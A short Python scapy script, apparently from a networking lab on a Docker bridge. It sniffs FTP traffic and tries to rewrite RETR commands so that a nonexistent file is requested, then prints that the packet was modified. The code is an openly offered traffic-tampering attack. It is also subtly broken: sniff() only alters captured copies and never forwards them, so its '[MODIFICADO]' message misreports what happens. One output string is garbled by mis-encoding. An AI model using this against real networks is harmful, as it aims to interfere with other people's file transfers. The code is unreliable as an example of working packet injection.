from scapy.all import *

def modificar_retr(pkt):
    if pkt.haslayer(Raw):
        payload = pkt[Raw].load.decode(errors='ignore')
        if 'RETR' in payload:
            print(f"[ORIGINAL] {payload.strip()}")
            pkt[Raw].load = b"RETR archivo_inexistente.txt\r\n"
            del pkt[IP].chksum
            del pkt[TCP].chksum
            print("[MODIFICADO] RETR archivo_inexistente.txt")

print("Interceptando trÃ¡fico FTP... esperando RETR")
sniff(filter="tcp port 21", prn=modificar_retr, iface="docker0")
